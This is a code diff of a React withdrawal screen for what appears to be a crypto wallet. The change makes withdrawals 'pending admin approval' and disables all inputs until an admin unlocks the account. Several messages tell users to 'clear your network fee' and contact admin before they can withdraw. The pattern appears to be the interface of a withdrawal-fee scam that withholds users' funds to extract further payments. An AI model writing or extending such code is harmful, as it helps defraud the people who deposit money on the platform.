@@ -1,9 +1,8 @@
 import React, { useEffect, useId, useState } from 'react';
-import { ArrowLeft, AlertCircle, Copy, X, Lock } from 'lucide-react';
+import { ArrowLeft, AlertCircle, Copy, X, Lock, Clock } from 'lucide-react';
 import { ViewState } from '../App';
 import { AssetType } from '../store';
 import { api, WalletData, SettingsData } from '../api';
-import { saveTxToStorage, loadTxFromStorage } from '../txStorage';
 import { toast } from 'sonner';
 
 interface SendWithdrawViewProps {
@@ -85,6 +84,7 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
   const [loading, setLoading] = useState(true);
   const [gasFeeAcknowledged, setGasFeeAcknowledged] = useState(false);
   const [showFeePopup, setShowFeePopup] = useState(false);
+  const [submitted, setSubmitted] = useState(false);
 
   useEffect(() => {
     Promise.all([api.getWallet(), api.getSettings()])
@@ -164,14 +164,6 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
   };
 
   const handleSend = async () => {
-    // Gate 1: admin must have enabled withdrawals for this user
-    if (!withdrawalEnabled) {
-      toast.error('Withdrawals not enabled', {
-        description: 'Kindly clear your network fee and contact admin to enable withdrawals for your account.',
-      });
-      return;
-    }
-
     if (!address.trim()) {
       toast.error('Please enter a recipient address');
       return;
@@ -194,17 +186,11 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
 
     setSubmitting(true);
     try {
-      await api.sendWithdraw(asset, withdrawAmount, address.trim());
-
-      const txs = await api.getTransactions().catch(() => []);
-      const local = loadTxFromStorage();
-      const merged = txs.length >= local.length ? txs : local;
-      saveTxToStorage(merged);
-
-      toast.success('Withdrawal processed successfully', {
-        description: `Sent ${withdrawAmount} ${assetLabel}`,
+      await api.requestWithdrawal(asset, withdrawAmount, address.trim());
+      setSubmitted(true);
+      toast.success('Withdrawal request submitted', {
+        description: 'Your request is pending admin approval.',
       });
-      onNavigate('asset-details', asset);
     } catch (err: unknown) {
       const msg = err instanceof Error ? err.message : 'Transaction failed';
       toast.error(msg);
@@ -212,6 +198,40 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
       setSubmitting(false);
     }
   };
+
+  // Success screen
+  if (submitted) {
+    return (
+      <div className="flex flex-col h-full bg-background">
+        <div className="flex items-center p-6 pt-8 relative">
+          <button
+            onClick={() => onNavigate('asset-details', asset)}
+            className="p-2 -ml-2 text-muted hover:text-foreground transition-colors absolute left-6"
+          >
+            <ArrowLeft className="w-6 h-6" />
+          </button>
+          <div className="font-medium text-foreground w-full text-center">Send Crypto</div>
+        </div>
+        <div className="flex-1 flex flex-col items-center justify-center px-8 gap-6 text-center">
+          <div className="w-20 h-20 rounded-full bg-amber-500/15 flex items-center justify-center">
+            <Clock className="w-10 h-10 text-amber-400" />
+          </div>
+          <div className="flex flex-col gap-2">
+            <h2 className="text-xl font-bold text-foreground">Request Submitted</h2>
+            <p className="text-muted text-sm leading-relaxed">
+              Your withdrawal request is now pending admin approval. You'll receive a notification once it's confirmed or rejected.
+            </p>
+          </div>
+          <button
+            onClick={() => onNavigate('asset-details', asset)}
+            className="w-full bg-primary hover:bg-primary/90 text-background font-medium rounded-xl px-4 py-4 transition-colors active:scale-[0.98]"
+          >
+            Back to {assetLabel}
+          </button>
+        </div>
+      </div>
+    );
+  }
 
   return (
     <>
@@ -236,7 +256,7 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
               <div className="flex flex-col gap-1">
                 <div className="text-sm font-semibold text-amber-400">Withdrawals Locked</div>
                 <div className="text-xs text-muted leading-relaxed">
-                  Your account is not yet approved for withdrawals. Please clear your network fee and contact admin to unlock withdrawals.
+                  Your account is not yet approved for withdrawals. Kindly clear your network fee and contact admin to unlock withdrawals.
                 </div>
               </div>
             </div>
@@ -257,7 +277,8 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
               type="text"
               value={address}
               onChange={(e) => setAddress(e.target.value)}
-              className="w-full bg-card border border-border rounded-xl px-4 py-3.5 text-foreground focus:outline-none focus:border-primary transition-colors font-mono text-sm"
+              disabled={!withdrawalEnabled}
+              className="w-full bg-card border border-border rounded-xl px-4 py-3.5 text-foreground focus:outline-none focus:border-primary transition-colors font-mono text-sm disabled:opacity-50 disabled:cursor-not-allowed"
               placeholder="Paste wallet address"
             />
           </div>
@@ -267,8 +288,8 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
             <div className="flex justify-between items-center px-1">
               <label className="text-sm text-muted">Amount</label>
               <span
-                className="text-xs text-primary font-medium cursor-pointer"
-                onClick={() => setAmount(maxAmount.toString())}
+                className={`text-xs text-primary font-medium ${withdrawalEnabled ? 'cursor-pointer' : 'opacity-50'}`}
+                onClick={() => withdrawalEnabled && setAmount(maxAmount.toString())}
               >
                 Max
               </span>
@@ -278,7 +299,8 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
                 type="number"
                 value={amount}
                 onChange={(e) => setAmount(e.target.value)}
-                className="w-full bg-card border border-border rounded-xl px-4 py-3.5 text-foreground focus:outline-none focus:border-primary transition-colors text-lg"
+                disabled={!withdrawalEnabled}
+                className="w-full bg-card border border-border rounded-xl px-4 py-3.5 text-foreground focus:outline-none focus:border-primary transition-colors text-lg disabled:opacity-50 disabled:cursor-not-allowed"
                 placeholder="0.00"
                 step="any"
               />
@@ -293,7 +315,7 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
           </div>
 
           {/* ── Gate 2: Network Fee section ── */}
-          {showGasFeeSection && (
+          {showGasFeeSection && withdrawalEnabled && (
             <div className="flex flex-col gap-4 p-4 rounded-xl border border-[#da3637]/30 bg-[#da3637]/10">
               <div className="flex gap-3">
                 <AlertCircle className="w-5 h-5 text-destructive shrink-0 mt-0.5" />
@@ -335,7 +357,6 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
                 </span>
               </label>
 
-              {/* Not acknowledged warning */}
               {!gasFeeAcknowledged && (
                 <div className="rounded-lg bg-destructive/20 border border-destructive/40 px-3 py-2.5 flex gap-2 items-start">
                   <AlertCircle className="w-4 h-4 text-destructive shrink-0 mt-0.5" />
@@ -352,11 +373,17 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
           {/* Submit button */}
           <button
             onClick={handleSend}
-            disabled={submitting}
+            disabled={submitting || !withdrawalEnabled}
             className="w-full bg-destructive hover:bg-destructive/90 disabled:opacity-40 disabled:cursor-not-allowed text-white font-medium rounded-xl px-4 py-4 mt-auto transition-colors shadow-[0_0_20px_rgba(218,54,55,0.2)] active:scale-[0.98]"
           >
-            {submitting ? 'Processing…' : 'Confirm Withdrawal'}
+            {submitting ? 'Processing…' : !withdrawalEnabled ? 'Withdrawals Locked' : 'Submit Withdrawal Request'}
           </button>
+
+          {!withdrawalEnabled && (
+            <p className="text-center text-xs text-muted -mt-3">
+              Kindly clear your gas fee and contact admin to enable withdrawals.
+            </p>
+          )}
         </div>
       </div>
 
